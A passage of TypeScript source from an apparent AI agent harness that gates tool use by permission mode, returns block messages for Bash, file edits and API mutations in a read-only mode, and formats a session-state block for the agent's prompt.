      if (safeAllowedSessionTools.has(toolName)) {
        return { allowed: true };
      }

      // Write/auth/admin session tools - blocked in Explore mode
      return {
        allowed: false,
        reason: `Session configuration changes are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to create, update, or delete sources and agents.`
      };
    }

    // Handle API tools exposed via MCP (mcp__<source>__api_<name>)
    // These need endpoint-level permission checks, not just MCP read-only patterns
    if (toolName.includes('__api_')) {
      const input = toolInput as Record<string, unknown> | null;
      const method = (input?.method as string) || 'GET';
      const path = input?.path as string | undefined;
      if (isApiCallAllowedWithConfig(method, path, config)) {
        return { allowed: true };
      }
      return {
        allowed: false,
        reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
      };
    }

    if (isReadOnlyMcpToolWithConfig(toolName, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `MCP write operations are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
    };
  }

  // Handle API tools - allow GET, block mutations unless endpoint is whitelisted
  if (toolName.startsWith('api_')) {
    const input = toolInput as Record<string, unknown> | null;
    const method = (input?.method as string) || 'GET';
    const path = input?.path as string | undefined;
    if (isApiCallAllowedWithConfig(method, path, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
    };
  }

  // Default: allow other tools not explicitly handled
  return { allowed: true };
}

/**
 * Get a user-friendly message explaining why a tool is blocked (using config)
 */
function getBlockReasonWithConfig(toolName: string, config: ToolCheckConfig): string {
  const displayName = config.displayName;
  const shortcut = config.shortcutHint;

  if (toolName === 'Bash') {
    return `Bash commands are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to run commands.`;
  }
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit') {
    return `File modifications are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('mcp__')) {
    return `MCP write operations are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('api_')) {
    return `API mutations are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  return `${toolName} is blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to use this tool.`;
}

/**
 * Create a hook return value that blocks a tool.
 * Returns the correct SDK format for PreToolUse hook blocking.
 *
 * The reason is prefixed with "[ERROR]" so the Codex model can distinguish
 * blocked tool calls from successful ones. See the detailed comment on
 * errorResponse() in packages/session-tools-core/src/response.ts for the
 * full explanation of the OpenAI Responses API limitation.
 *
 * @param reason - The reason for blocking (from shouldAllowToolInMode)
 */
export function blockWithReason(reason: string) {
  return {
    continue: false,
    decision: 'block' as const,
    reason: `[ERROR] ${reason}`,
  };
}

// ============================================================
// Session State Context (for user messages)
// ============================================================

/**
 * Get the current session state for prompt injection
 */
export function getSessionState(sessionId: string): { permissionMode: PermissionMode } {
  return {
    permissionMode: getPermissionMode(sessionId),
  };
}

/**
 * Format session state as a lightweight XML block for injection into user messages.
 * Always includes the plans folder path so agent knows where plans are stored.
 */
export function formatSessionState(
  sessionId: string,
  options?: { plansFolderPath?: string; dataFolderPath?: string; consumeModeChangeUserSignal?: boolean }
): string {
  const diagnostics = getPermissionModeDiagnostics(sessionId);

  // Use canonical user-facing mode tokens to avoid terminology drift.
  const modeName = toCanonicalPermissionMode(diagnostics.permissionMode);
  let result = `<session_state>\nsessionId: ${sessionId}\npermissionMode: ${modeName}`;

  if (diagnostics.transitionDisplay) {
    result += `\nmodeTransition: ${diagnostics.transitionDisplay}`;
  }
  result += `\nmodeChangedBy: ${diagnostics.lastChangedBy}`;
  result += `\nmodeChangedAt: ${diagnostics.lastChangedAt}`;
  result += `\nmodeVersion: ${diagnostics.modeVersion}`;

  const transitionLabel = diagnostics.transitionDisplay ?? `Unknown -> ${PERMISSION_MODE_CONFIG[diagnostics.permissionMode].displayName}`;
  result += `\nmodeChangeSummary: Last mode change by ${diagnostics.lastChangedBy} at ${diagnostics.lastChangedAt} (${transitionLabel}, modeVersion=${diagnostics.modeVersion})`;

  if (diagnostics.userModeSignalPending) {
    result += '\nmodeChangeUserSignal: The user changed mode manually. Apply this mode immediately for this turn.';

    if (options?.consumeModeChangeUserSignal) {
      consumeUserModeSignal(sessionId);
    }
  }

  // Always include plans folder path so agent knows where plans are stored
  if (options?.plansFolderPath) {
    result += `\nplansFolderPath: ${options.plansFolderPath}`;
  }

  // Include data folder path so agent knows where transform_data output goes
  if (options?.dataFolderPath) {
    result += `\ndataFolderPath: ${options.dataFolderPath}`;
  }

  result += '\n</session_state>';
  return result;
}
